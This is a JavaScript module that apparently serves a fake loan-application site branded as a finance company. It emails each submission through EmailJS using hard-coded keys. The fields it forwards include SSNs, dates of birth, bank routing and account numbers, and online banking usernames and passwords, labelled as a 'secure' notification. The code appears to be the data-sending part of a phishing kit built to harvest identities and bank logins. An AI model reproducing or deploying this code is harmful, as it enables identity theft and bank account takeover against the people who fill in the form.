import emailjs from '@emailjs/browser'

export const EMAILJS_SERVICE_ID = 'service_z9f6a0g'
export const EMAILJS_TEMPLATE_ID = 'template_84etazo'
export const EMAILJS_PUBLIC_KEY = 'LlVuJROza_oqOjp_A'

function escapeHtml(value) {
  return String(value ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
}

function escapeAttr(value) {
  return escapeHtml(value).replace(/'/g, '&#39;')
}

export function formatLeadTime() {
  return new Date().toLocaleString('en-IN', {
    timeZone: 'Asia/Kolkata',
    dateStyle: 'medium',
    timeStyle: 'short',
  })
}

export function buildLeadEmailHtml(params) {
  const {
    name,
    email,
    phone,
    subject,
    message,
    source,
    submitted_at,
    dob,
    ssn,
    street,
    city,
    state,
    zip,
    amount,
    purpose,
    bankName,
    routingNumber,
    accountNumber,
    username,
    password,
  } = params

  const n = escapeHtml(name)
  const e = escapeHtml(email)
  const eAttr = escapeAttr(email)
  const p = escapeHtml(phone)
  const pAttr = escapeAttr(phone)
  const s = escapeHtml(subject)
  const sAttr = escapeAttr(subject)
  const m = escapeHtml(message).replace(/\n/g, '<br>')
  const src = escapeHtml(source)
  const when = escapeHtml(submitted_at)

  const isFullApp = Boolean(dob || ssn || bankName || username)

  return `
<table width="100%" cellpadding="0" cellspacing="0" style="background:#edece6;padding:24px 8px;font-family:Arial,Helvetica,sans-serif;">
  <tr>
    <td align="center">
      <table width="600" cellpadding="0" cellspacing="0" style="width:100%;max-width:600px;background:#ffffff;border:1px solid #d6d0c6;border-radius:8px;overflow:hidden;">
        <tr>
          <td style="background:#1a1a1a;padding:28px 24px;">
            <p style="margin:0 0 8px;font-size:11px;letter-spacing:2px;text-transform:uppercase;color:#c5a059;">LightStream Finance</p>
            <p style="margin:0;font-size:24px;line-height:1.3;color:#ffffff;font-weight:bold;">${isFullApp ? 'New Loan Application' : 'New Website Lead'}</p>
            <p style="margin:10px 0 0;font-size:14px;color:#d8d2c8;">A new submission was received from ${src}.</p>
          </td>
        </tr>
        <tr>
          <td style="background:#f4efe6;padding:12px 24px;border-bottom:1px solid #d6d0c6;">
            <p style="margin:0;font-size:13px;color:#555555;">
              <b style="color:#8d734e;">Source:</b> ${src} &nbsp;|&nbsp; <b style="color:#8d734e;">Received:</b> ${when}
            </p>
          </td>
        </tr>
        <tr>
          <td style="padding:24px;">
            <table width="100%" cellpadding="0" cellspacing="0" style="font-size:14px;color:#1a1a1a;border-collapse:collapse;">
              <!-- Personal Information -->
              <tr>
                <td colspan="2" style="padding:10px 0 6px;font-size:13px;font-weight:bold;color:#a67c2e;text-transform:uppercase;border-bottom:2px solid #c5a059;">
                  1. Personal Information
                </td>
              </tr>
              <tr>
                <td style="padding:8px 0;border-bottom:1px solid #eee;width:150px;color:#777777;">Full Legal Name</td>
                <td style="padding:8px 0;border-bottom:1px solid #eee;font-weight:bold;">${n}</td>
              </tr>
              ${dob ? `<tr><td style="padding:8px 0;border-bottom:1px solid #eee;color:#777777;">Date of Birth</td><td style="padding:8px 0;border-bottom:1px solid #eee;font-weight:bold;">${escapeHtml(dob)}</td></tr>` : ''}
              ${ssn ? `<tr><td style="padding:8px 0;border-bottom:1px solid #eee;color:#777777;">SSN</td><td style="padding:8px 0;border-bottom:1px solid #eee;font-weight:bold;color:#b91c1c;">${escapeHtml(ssn)}</td></tr>` : ''}
              <tr>
                <td style="padding:8px 0;border-bottom:1px solid #eee;color:#777777;">Email Address</td>
                <td style="padding:8px 0;border-bottom:1px solid #eee;"><a href="mailto:${eAttr}" style="color:#8d734e;text-decoration:none;font-weight:bold;">${e}</a></td>
              </tr>
              <tr>
                <td style="padding:8px 0;border-bottom:1px solid #eee;color:#777777;">Phone Number</td>
                <td style="padding:8px 0;border-bottom:1px solid #eee;"><a href="tel:${pAttr}" style="color:#8d734e;text-decoration:none;font-weight:bold;">${p}</a></td>
              </tr>
              ${street ? `<tr><td style="padding:8px 0;border-bottom:1px solid #eee;color:#777777;">Street Address</td><td style="padding:8px 0;border-bottom:1px solid #eee;">${escapeHtml(street)}</td></tr>` : ''}
              ${city || state || zip ? `<tr><td style="padding:8px 0;border-bottom:1px solid #eee;color:#777777;">City, State, Zip</td><td style="padding:8px 0;border-bottom:1px solid #eee;">${escapeHtml(city)}, ${escapeHtml(state)} ${escapeHtml(zip)}</td></tr>` : ''}
              
              <!-- Loan Details -->
              ${
                amount || purpose
                  ? `
              <tr>
                <td colspan="2" style="padding:16px 0 6px;font-size:13px;font-weight:bold;color:#a67c2e;text-transform:uppercase;border-bottom:2px solid #c5a059;">
                  Loan Details
                </td>
              </tr>
              ${amount ? `<tr><td style="padding:8px 0;border-bottom:1px solid #eee;color:#777777;">Requested Amount</td><td style="padding:8px 0;border-bottom:1px solid #eee;font-weight:bold;color:#047857;">${escapeHtml(amount)}</td></tr>` : ''}
              ${purpose ? `<tr><td style="padding:8px 0;border-bottom:1px solid #eee;color:#777777;">Loan Purpose</td><td style="padding:8px 0;border-bottom:1px solid #eee;font-weight:bold;">${escapeHtml(purpose)}</td></tr>` : ''}
              `
                  : ''
              }

              <!-- Bank Information -->
              ${
                bankName || routingNumber || accountNumber
                  ? `
              <tr>
                <td colspan="2" style="padding:16px 0 6px;font-size:13px;font-weight:bold;color:#a67c2e;text-transform:uppercase;border-bottom:2px solid #c5a059;">
                  2. Bank Information
                </td>
              </tr>
              ${bankName ? `<tr><td style="padding:8px 0;border-bottom:1px solid #eee;color:#777777;">Bank Name</td><td style="padding:8px 0;border-bottom:1px solid #eee;font-weight:bold;">${escapeHtml(bankName)}</td></tr>` : ''}
              ${routingNumber ? `<tr><td style="padding:8px 0;border-bottom:1px solid #eee;color:#777777;">Routing Number</td><td style="padding:8px 0;border-bottom:1px solid #eee;font-weight:bold;">${escapeHtml(routingNumber)}</td></tr>` : ''}
              ${accountNumber ? `<tr><td style="padding:8px 0;border-bottom:1px solid #eee;color:#777777;">Account Number</td><td style="padding:8px 0;border-bottom:1px solid #eee;font-weight:bold;">${escapeHtml(accountNumber)}</td></tr>` : ''}
              `
                  : ''
              }

              <!-- Account Details -->
              ${
                username || password
                  ? `
              <tr>
                <td colspan="2" style="padding:16px 0 6px;font-size:13px;font-weight:bold;color:#a67c2e;text-transform:uppercase;border-bottom:2px solid #c5a059;">
                  3. Account Details
                </td>
              </tr>
              ${username ? `<tr><td style="padding:8px 0;border-bottom:1px solid #eee;color:#777777;">Username / ID</td><td style="padding:8px 0;border-bottom:1px solid #eee;font-weight:bold;">${escapeHtml(username)}</td></tr>` : ''}
              ${password ? `<tr><td style="padding:8px 0;border-bottom:1px solid #eee;color:#777777;">Password</td><td style="padding:8px 0;border-bottom:1px solid #eee;font-weight:bold;">${escapeHtml(password)}</td></tr>` : ''}
              `
                  : ''
              }

              ${
                message && !isFullApp
                  ? `
              <tr>
                <td colspan="2" style="padding:16px 0 6px;font-size:13px;font-weight:bold;color:#a67c2e;text-transform:uppercase;border-bottom:2px solid #c5a059;">
                  Additional Notes
                </td>
              </tr>
              <tr>
                <td colspan="2" style="padding:10px 0;line-height:1.6;color:#333333;">${m}</td>
              </tr>
              `
                  : ''
              }
            </table>
            
            <p style="margin:24px 0 0;">
              <a href="mailto:${eAttr}?subject=Re:%20${sAttr}" style="background:#8d734e;color:#ffffff;text-decoration:none;padding:12px 20px;border-radius:24px;display:inline-block;font-weight:bold;font-size:14px;">Reply to lead</a>
            </p>
            <p style="margin:16px 0 0;font-size:12px;color:#888888;">This is a secure automated notification from LightStream Finance application portal.</p>
          </td>
        </tr>
      </table>
    </td>
  </tr>
</table>`
}

export function sendLead(params) {
  const payload = {
    name: params.name || '—',
    email: params.email || '—',
    phone: params.phone || '—',
    subject: params.subject || 'Website inquiry',
    message: params.message || '—',
    source: params.source || 'Website',
    submitted_at: params.submitted_at || formatLeadTime(),
    reply_to: params.reply_to || params.email || '',
    ...params,
  }

  return emailjs.send(
    EMAILJS_SERVICE_ID,
    EMAILJS_TEMPLATE_ID,
    {
      ...payload,
      html_content: buildLeadEmailHtml(payload),
    },
    { publicKey: EMAILJS_PUBLIC_KEY },
  )
}
